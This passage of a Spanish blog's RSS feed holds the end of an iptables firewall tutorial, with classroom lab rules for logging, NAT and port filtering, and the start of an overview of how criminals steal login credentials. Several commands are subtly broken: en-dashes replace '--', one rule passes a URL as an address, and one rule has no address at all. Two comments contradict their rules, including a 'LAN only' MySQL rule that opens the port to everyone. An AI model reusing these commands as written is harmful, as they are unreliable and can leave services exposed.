&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Podemos usar también nombres de dominio:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A OUTPUT -p tcp -d www.facebook.com -j DROP
iptables -A OUTPUT -p tcp -d facebook.com -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;De la página del man de iptables:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;hellip; specifying any name to be resolved with a remote query such as DNS (e.g., facebook.com is a really bad idea), a network IP address (with /mask), or a plain IP address &amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&#34;12-log-y-borrar-paquetes&#34;&gt;#12: Log y borrar paquetes&lt;/h1&gt;

&lt;p&gt;Escribe lo siguiente para añadir al log y bloquear IP spoofing en una interfaz pública llamada eth1&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j LOG --log-prefix &lt;span class=&#34;s2&#34;&gt;&amp;quot;IP_SPOOF A: &amp;quot;&lt;/span&gt;
iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Por defecto el log está en el archivo /var/log/messages&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;tail -f /var/log/messages
grep --color &lt;span class=&#34;s1&#34;&gt;&amp;#39;IP SPOOF&amp;#39;&lt;/span&gt; /var/log/messages
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;13-log-y-borrar-paquetes-con-un-número-limitado-de-entradas-al-log&#34;&gt;#13: Log y borrar paquetes con un número limitado de entradas al log&lt;/h1&gt;

&lt;p&gt;El módulo -m limit puede limitar el número de entradas al log creadas por tiempo. Se usa para prevenir que el archivo de log se inunde. Para añadir al log y elminar spoofing cada 5 minutos, en ráfagas de 7 entradas:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -i eth1 -s 10.0.0.0/8 -m limit --limit 5/m --limit-burst &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; -j LOG --log-prefix &lt;span class=&#34;s2&#34;&gt;&amp;quot;IP_SPOOF A: &amp;quot;&lt;/span&gt;
iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;14-aceptar-o-denegar-tráfico-desde-dirección-mac&#34;&gt;#14: Aceptar o denegar tráfico desde dirección MAC&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -m mac --mac-source 00:0F:EA:91:04:08 -j DROP
&lt;span class=&#34;c1&#34;&gt;## *only accept traffic for TCP port # 8080 from mac 00:0F:EA:91:04:07 * ##&lt;/span&gt;
iptables -A INPUT -p tcp --destination-port &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -m mac --mac-source 00:0F:EA:91:04:07 -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;15-bloquear-o-permitir-peticiones-ping-icmp&#34;&gt;#15: Bloquear o permitir peticiones ping ICMP&lt;/h1&gt;

&lt;p&gt;Para bloquear peticiones ping ICMP&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
iptables -A INPUT -i eth1 -p icmp --icmp-type echo-request -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Las respuestas al ping también se puede limitar a ciertas redes o hosts.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -s 192.168.1.0/24 -p icmp --icmp-type echo-request -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Lo siguiente solo acepta limitados tipos de peticiones ICMP:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;### ** assumed that default INPUT policy set to DROP ** #############&lt;/span&gt;
iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT
iptables -A INPUT -p icmp --icmp-type destination-unreachable -j ACCEPT
iptables -A INPUT -p icmp --icmp-type time-exceeded -j ACCEPT
&lt;span class=&#34;c1&#34;&gt;## ** all our server to respond to pings ** ##&lt;/span&gt;
iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;16-abrir-un-rango-de-puertos&#34;&gt;#16: Abrir un rango de puertos&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 7000:7010 -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;17-abrir-un-rango-de-direcciones-ip&#34;&gt;#17: Abrir un rango de direcciones ip&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;## only accept connection to tcp port 80 (Apache) if ip is between 192.168.1.100 and 192.168.1.200 ##&lt;/span&gt;
iptables -A INPUT -p tcp --destination-port &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; -m iprange --src-range 192.168.1.100-192.168.1.200 -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;## nat example ##&lt;/span&gt;
iptables -t nat -A POSTROUTING -j SNAT --to-source 192.168.1.20-192.168.1.25
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;19-bloquear-o-abrir-puertos-comunes&#34;&gt;#19: Bloquear o abrir puertos comunes&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;Replace ACCEPT with DROP to block port:

&lt;span class=&#34;c1&#34;&gt;## open port ssh tcp port 22 ##&lt;/span&gt;
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -j ACCEPT
iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -j ACCEPT

&lt;span class=&#34;c1&#34;&gt;## open cups (printing service) udp/tcp port 631 for LAN users ##&lt;/span&gt;
iptables -A INPUT -s 192.168.1.0/24 -p udp -m udp --dport &lt;span class=&#34;m&#34;&gt;631&lt;/span&gt; -j ACCEPT
iptables -A INPUT -s 192.168.1.0/24 -p tcp -m tcp --dport &lt;span class=&#34;m&#34;&gt;631&lt;/span&gt; -j ACCEPT

&lt;span class=&#34;c1&#34;&gt;## allow time sync via NTP for lan users (open udp port 123) ##&lt;/span&gt;
iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p udp --dport &lt;span class=&#34;m&#34;&gt;123&lt;/span&gt; -j ACCEPT

&lt;span class=&#34;c1&#34;&gt;## open tcp port 25 (smtp) for all ##&lt;/span&gt;
iptables -A INPUT -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -j ACCEPT

&lt;span class=&#34;c1&#34;&gt;# open dns server ports for all ##&lt;/span&gt;
iptables -A INPUT -m state --state NEW -p udp --dport &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; -j ACCEPT

&lt;span class=&#34;c1&#34;&gt;## open http/https (Apache) server port to all ##&lt;/span&gt;
iptables -A INPUT -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; -j ACCEPT
iptables -A INPUT -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt; -j ACCEPT

&lt;span class=&#34;c1&#34;&gt;## open tcp port 110 (pop3) for all ##&lt;/span&gt;
iptables -A INPUT -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;110&lt;/span&gt; -j ACCEPT

&lt;span class=&#34;c1&#34;&gt;## open tcp port 143 (imap) for all ##&lt;/span&gt;
iptables -A INPUT -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;143&lt;/span&gt; -j ACCEPT

&lt;span class=&#34;c1&#34;&gt;## open access to Samba file server for lan users only ##&lt;/span&gt;
iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;137&lt;/span&gt; -j ACCEPT
iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;138&lt;/span&gt; -j ACCEPT
iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;139&lt;/span&gt; -j ACCEPT
iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt; -j ACCEPT

&lt;span class=&#34;c1&#34;&gt;## open access to proxy server for lan users only ##&lt;/span&gt;
iptables -A INPUT -s 192.168.1.0/24 -m state --state NEW -p tcp --dport &lt;span class=&#34;m&#34;&gt;3128&lt;/span&gt; -j ACCEPT

&lt;span class=&#34;c1&#34;&gt;## open access to mysql server for lan users only ##&lt;/span&gt;
iptables -I INPUT -p tcp --dport &lt;span class=&#34;m&#34;&gt;3306&lt;/span&gt; -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;20-restringir-el-número-de-conexiones-paralelas-a-un-servidor-por-direccion-ip-del-cliente&#34;&gt;#20: Restringir el número de conexiones paralelas a un servidor por direccion Ip del cliente.&lt;/h1&gt;

&lt;p&gt;Se puede usar connlimit para crear algunas restricciones. Para permitir 3 conexiones ssh por cliente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -p tcp --syn --dport &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -m connlimit --connlimit-above &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; -j REJECT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Establecer las peticiones HTTP a 20:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -p tcp --syn --dport &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; -m connlimit --connlimit-above &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; --connlimit-mask &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt; -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;donde:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&amp;ndash;connlimit-above 3&lt;/strong&gt; : Coincide si el número de conexiones existentes está por encima de 3.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&amp;ndash;connlimit-mask 24&lt;/strong&gt; : Grupos de hosts usando el prefijo de longitud. Para IPv4, debe ser un número entre 0 y 32 (incluyéndolos.)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;21-howto-use-iptables-like-a-pro&#34;&gt;#21: HowTO: Use iptables Like a Pro&lt;/h1&gt;

&lt;p&gt;Para más información sobre iptables, échale un vistazo al manual:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;man iptables
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Para ver la ayuda en general o de un comando específico:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -h
iptables -j DROP -h
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;21-1-probando-nuestro-firewall&#34;&gt;#21.1: Probando nuestro firewall&lt;/h2&gt;

&lt;p&gt;Conocer si hay puertos abiertos o no:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;netstat -tulpn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Es recomendable instalarse un &lt;a href=&#34;https://elbauldelprogramador.com/esnifando-la-red-pruebas-de-seguridad&#34;&gt;sniffer&lt;/a&gt; como tcpdupm y ngrep para probar la configuración de nuestro firewall.&lt;/p&gt;

&lt;h1 id=&#34;conclusión&#34;&gt;Conclusión&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;Esta entrada solo lista las reglas básicas para los usuarios nuevos en linux. Se pueden crear reglas más complejas. Requiere una buena comprensión de TCP/IP, tunning del kernel linux via sysctl.conf y un buen conocimiento de nuestra configuración.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Fuente original: &lt;a target=&#34;_blank&#34; href=&#34;http://www.cyberciti.biz/tips/linux-iptables-examples.html&#34;&gt;cyberciti&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;más-reglas-cortesía-de-jker&#34;&gt;Más reglas cortesía de Jker&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;Reestablece las reglas por defecto.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;sudo su
iptables -F
iptables -t nat -F
iptables -t mangle -F
iptables -X
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;IPtables -nL para ver que estan vacias&lt;/p&gt;

&lt;h2 id=&#34;configura-la-máquina-para-que-sólo-se-pueda-acceder-desde-ella-a-las-webs-http-www-google-es-y-http-www-iesgoya-com-y-a-ninguna-otra&#34;&gt;Configura la máquina para que sólo se pueda acceder desde ella a las webs &lt;a href=&#34;http://www.google.es&#34;&gt;http://www.google.es&lt;/a&gt; y &lt;a href=&#34;http://www.iesgoya.com&#34;&gt;http://www.iesgoya.com&lt;/a&gt; y a ninguna otra.&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A OUTPUT -d http://www.google.es -j ACCEPT
iptables -A OUTPUT -d http://www.iesgoya.com -j ACCEPT
iptables -A OUTPUT -p tcp –dport &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; -j DROP &lt;span class=&#34;c1&#34;&gt;# Mas exigente –&amp;gt; iptables -A OUTPUT -p all -j DROP&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;como-google-tiene-muchas-ips-puede-que-tengamos-un-problema-para-ello-realizamos-lo-siguiente-antes-de-la-regla-exigente&#34;&gt;Como google tiene muchas IPs puede que tengamos un problema para ello realizamos lo siguiente antes de la regla EXIGENTE:&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -I OUTPUT &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -d 212.106.221.0/24 -j ACCEPT
iptables -I OUTPUT &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -d 173.194.0.0/16 -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;mostrar-las-reglas-que-llevamos-hasta-el-momento&#34;&gt;Mostrar las reglas que llevamos hasta el momento:&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -nL –line-numbers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;si-queremos-borrar-reglas&#34;&gt;Si queremos borrar reglas:&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -D OUTPUT 5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;cierra-todos-los-puertos-bien-conocidos-menos-los-necesarios-para-acceder-a-estas-dos-webs&#34;&gt;Cierra todos los puertos bien conocidos menos los necesarios para acceder a estas dos webs.&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A OUTPUT -p TCP –dport &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; -j ACCEPT
iptables -A OUTPUT -p UDP –dport &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; -j ACCEPT
iptables -A OUTPUT -p TCP –dport 1:1024 -j DROP
iptables -A OUTPUT -p UDP –dport 1:1024 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;investiga-de-qué-forma-podrías-hacer-que-las-peticiones-entrantes-a-tu-máquina-virtual-al-puerto-81-por-http-vayan-mediante-nat-al-puerto-80-de-la-máquina-local-arranca-wamp-para-comprobar-que-funciona&#34;&gt;Investiga de qué forma podrías hacer que las peticiones entrantes a tu máquina virtual al puerto 81 por http vayan mediante NAT al puerto 80 de la máquina local (arranca WAMP para comprobar que funciona).&lt;/h2&gt;

&lt;p&gt;Arrancamos wamp en la maquina fisica y comprobamos que accedemos a wamp desde localhost.Comprobamos que podemos acceder desde la maquina virtual y se encuentra cortado&lt;/p&gt;

&lt;p&gt;Miramos la IP de la maquina virtual. Ahora desde la maquina fisica intentamos acceder desde el puerto 81 con la IP esa.&lt;/p&gt;

&lt;p&gt;Habilitamos el enrutamiento entre tarjetas de red de nuestro equipo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &amp;gt; /proc/sys/net/ipv4/ip_forward
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Ejecutamos las siguientes reglas&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -t nat -A PREROUTING -p tcp –dport &lt;span class=&#34;m&#34;&gt;81&lt;/span&gt; -j DNAT –to- destination 192.168.203.200:80

iptables -t nat -A POSTROUTING -s 192.168.203.0/24 -j MASQUERADE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;para-ver-las-reglas-introducidas&#34;&gt;Para ver las reglas introducidas:&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -t nat -nL –line-numbers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;permite-sólo-los-mensajes-entrantes-desde-la-ip-del-compañero-de-tu-máquina-física-prueba-desde-otro-sitio-para-ver-si-funciona&#34;&gt;Permite sólo los mensajes entrantes desde la IP del compañero de tu máquina física (prueba desde otro sitio para ver si funciona).&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -s 192.168.203.200 -j ACCEPT
iptables -A INPUT -j DROP

iptables -A FORWARD -s 192.168.203.200 -j ACCEPT
iptables -A FORWARD -s -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;activa-el-log-sobre-todas-las-reglas-y-verifica-que-se-anotan-los-mensajes&#34;&gt;Activa el log sobre todas las reglas y verifica que se anotan los mensajes.&lt;/h2&gt;

&lt;p&gt;Insertamos en IPTABLEs las reglas para activar el log:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -I FORWARD &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -j LOG –log-prefix ‘IPTABLESFORWARD: ‘
iptables -I INPUT &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -j LOG –log-prefix ‘IPTABLESINPUT: ‘

iptables -t nat -I PREROUTING &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -j LOG –log-prefix ‘IPTABLESPREROUTING: ‘
iptables -t nat -I POSTROUTING &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -j LOG –log-prefix ‘IPTABLESPREROUTING: ‘

iptables -I OUTPUT &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -j LOG –log-prefix ‘IPTABLESOUTPUT: ‘
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;NOTA: hay que ponerlas las primeras para que haga log antes de rechazarlo.&lt;/p&gt;

&lt;p&gt;Ahora editamos el archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;gedit /etc/rsyslog.d/50-default.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;E incluimos al final:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;kern.warning /var/log/iptables.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        
        <item>
            <title>6 formas usadas por los cibercriminales para robar o vulnerar credenciales de login</title>
            <link>https://elbauldelprogramador.com/6-formas-usadas-por-los-cibercriminales-para-robar-o-vulnerar-credenciales-de-login/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/6-formas-usadas-por-los-cibercriminales-para-robar-o-vulnerar-credenciales-de-login/</guid>
            <description>&lt;p&gt;&lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2013/06/blog_sevenways.png&#34; alt=&#34;7 formas usadas por cibercriminales para robar o vulnerar credenciales de login&#34; width=&#34;700px&#34; height=&#34;350px&#34; /&gt;&lt;/p&gt;

&lt;p&gt;El mundo digital es un vecindario muy peligroso lleno de atacantes listos para robar los datos más personales e importantes para los negocios. A estas alturas deberíamos saber que la ”*&lt;a href=&#34;https://elbauldelprogramador.com/categories/seguridad/&#34;&gt;seguridad&lt;/a&gt;*” significa algo más que disponer de una contraseña única y larga. Para entender cómo proteger nuestros datos y cuentas, en &lt;em&gt;duosecurity&lt;/em&gt; han hecho una recopilación de las formas más comunes que usan los atacantes para robar datos ajenos en la red.&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;h1 id=&#34;1-malware&#34;&gt;1: Malware&lt;/h1&gt;

&lt;p&gt;El &lt;strong&gt;malware&lt;/strong&gt; representa un conjunto de amenazas a un sistema, como &lt;strong&gt;spyware, keyloggers y troyanos&lt;/strong&gt;. Con este tipo de software maligno, las contraseñas son un objetivo muy valioso para los atacantes que infectan el sistema. Si piensas que el robo de contraseñas usando &lt;strong&gt;malware&lt;/strong&gt; es complicado, quizá te sorprenda saber que existen unos kits de malware llamados &lt;strong&gt;&lt;a href=&#34;http://blog.webroot.com/2013/01/30/a-peek-inside-a-diy-password-stealing-malware/&#34; target=&#34;_blank&#34;&gt;DIY&lt;/a&gt;&lt;/strong&gt;(Do it yourself) diseñados específicamente para tal fin. Además, los troyanos se están centrando en robar datos críticos como los datos de acceso a bancos con una variante a &lt;strong&gt;&lt;a href=&#34;http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)&#34; target=&#34;_blank&#34;&gt;Zeus&lt;/a&gt;&lt;/strong&gt; llamada &lt;strong&gt;&lt;a href=&#34;http://gcn.com/articles/2012/01/10/zeus-trojan-returns-steals-bank-account-info-fbi-warns.aspx&#34; target=&#34;_blank&#34;&gt;Gameover&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;h1 id=&#34;2-brechas-en-sitios-webs&#34;&gt;2: Brechas en sitios Webs&lt;/h1&gt;

&lt;p&gt;Confiamos una gran cantidad de datos sensibles a sitios webs de todo tipo, y los agujeros de seguridad son bastante más frecuentes de lo que pensamos. A través de varios métodos, como &lt;a href=&#34;https://elbauldelprogramador.com/introduccion-sql-sql-introduction/&#34;&gt;inyección SQL&lt;/a&gt;, subida remota de archivos o un simple ataque a fuerza bruta para romper credenciales de los usuarios las webs están contínuamente siendo atacadas. Cualquiera que tenga un servidor propio sabrá lo cierto que es esto. Una vez que se logra robar una &lt;a href=&#34;https://elbauldelprogramador.com/como-se-almacenan-tus-contrasenas-en-internet-y-cuando-la-longitud-de-la-misma-no-importa/&#34; title=&#34;Cómo se almacenan tus contraseñas en internet (y cuando la longitud de la misma no importa)&#34;&gt;contraseña&lt;/a&gt;, la información filtrada a menudo acaba en lugares como &lt;em&gt;pastebin&lt;/em&gt; y redes &lt;em&gt;bittorrent&lt;/em&gt;, esperando a ser usadas. Si además se usa la misma contraseña en todas las webs el daño puede ser enorme.&lt;/p&gt;

&lt;h1 id=&#34;3-configuraciones-de-software-incorrectas&#34;&gt;3: Configuraciones de software incorrectas&lt;/h1&gt;

&lt;p&gt;Si alguna vez has configurado un software destinado al entorno empresarial, seguramente sabrás que seleccionar por error (o no seleccionar) una casilla o cualquier configuración sensible puede marcar la diferencia entre estar seguro o ser un blanco fácil. Éstas configuraciones incorrectas que conducen a las brechas en la seguridad son bastante comunes. La complejidad de la seguridad frecuentemente da lugar a descuidos menores que se convierten en graves problemas.&lt;/p&gt;

&lt;h1 id=&#34;4-vulnerabilidades-en-las-aplicaciones&#34;&gt;4: Vulnerabilidades en las aplicaciones&lt;/h1&gt;

&lt;p&gt;El código fuente siempre tendrá bugs. Mientras sigamos desarrollando mayores y más complejas aplicaciones, la probabilidad de que aumenten los problemas de seguridad del código es casi una certeza. En error en la comprobación de un trozo de código puede fácilmente desenbocar en un problema muy grave, como &lt;a href=&#34;http://www.enterprisenetworkingplanet.com/netsecur/article.php/3916331/Watch-for-Authentication-Bypass-Vulnerabilities.htm&#34; target=&#34;_blank&#34;&gt;saltarse la autentificación&lt;/a&gt;. Por tanto, un fallo de seguridad en un trozo de código podría dar por válido a un usuario incorrecto o permitir al atacante saltarse la autentificación por completo.&lt;/p&gt;

&lt;h1 id=&#34;5-estafas-de-phishing&#34;&gt;5: Estafas de Phishing&lt;/h1&gt;

&lt;p&gt;El phishing es una forma de enviar correspondencia (como el email) que engaña a la víctima para hacerle clickar en un enlace hacia un formulario de apariencia normal pero fraudulento, haciendose pasar por un formulario legítimo, como el de nuestro banco. Al rellenar el formulario creyendo que es legítimo, en realidad se están enviando esos datos a los cibercriminales.&lt;/p&gt;

&lt;h1 id=&#34;6-control-de-acceso&#34;&gt;6: Control de Acceso&lt;/h1&gt;

